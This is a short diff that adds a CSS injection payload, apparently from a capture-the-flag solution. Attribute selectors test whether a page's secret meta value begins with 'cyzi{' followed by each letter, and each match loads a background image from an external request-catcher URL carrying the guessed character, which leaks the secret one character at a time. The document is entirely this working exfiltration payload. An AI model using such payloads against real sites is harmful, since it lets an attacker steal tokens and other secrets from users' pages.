@@ -1,0 +1,13 @@
+html:has(meta[name=secret][content^="cyzi{a"]) {
+    background-image: url(https://azrael.requestcatcher.com/?secret=a);
+}
+
+html:has(meta[name=secret][content^="cyzi{b"]) {
+    background-image: url(https://azrael.requestcatcher.com/?secret=b);
+}
+
+/* etc... */
+
+html:has(meta[name=secret][content^="cyzi{w"]) {
+    background-image: url(https://azrael.requestcatcher.com/?secret=w);
+}
